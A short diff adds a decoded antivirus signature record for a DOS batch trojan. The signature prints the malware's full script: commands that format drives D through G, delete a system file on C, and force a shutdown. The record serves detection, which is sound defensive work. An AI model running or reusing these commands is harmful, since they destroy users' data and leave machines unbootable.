@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36647
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off format /a /f /s /q d:\ format /a /f /s /q e:\ format /a /f /s /q f:\ format /a /f /s /q g:\ del /f /s /q c:\ntldr.dll -y shutdown -s -t 10 -c "bye bye ........" exit
